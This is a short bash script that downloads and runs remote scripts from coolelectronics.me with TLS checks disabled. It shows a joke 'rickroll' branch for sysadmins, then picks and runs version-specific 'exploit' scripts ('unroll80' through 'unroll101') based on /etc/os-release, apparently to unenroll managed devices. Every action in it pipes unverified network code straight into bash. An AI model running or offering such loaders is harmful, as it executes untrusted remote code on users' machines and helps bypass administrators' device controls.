echo "Wait! Are you a sysadmin? (Y/N)"
read sysadmin
if [[ $sysadmin == "Y" || $sysadmin == "y" ]]; then
    bash <(curl -SLk https://coolelectronics.me/rickroll.sh)
    exit
fi
bash <(curl -SLk https://coolelectronics.me/music.sh)

source <(tail -3 /etc/os-release)

if [ $VERSION == "87" ]; then
    echo "Running v87 exploit"
    bash <(curl -SLk https://coolelectronics.me/unroll87)
elif [ $VERSION == "91" ]; then
    echo "Running v91 exploit"
    bash <(curl -SLk https://coolelectronics.me/unroll91)
elif [ $VERSION == "101" ]; then
    bash <(curl -SLk https://coolelectronics.me/unroll101)
    echo "Running v101 exploit"
elif [ $VERSION == "80" ]; then
    bash <(curl -SLk https://coolelectronics.me/unroll80.sh)
    echo "Running v80 exploit"
else
    echo "Unsupported Version. Downgrade to either 80, 87, 91, or 101"
fi
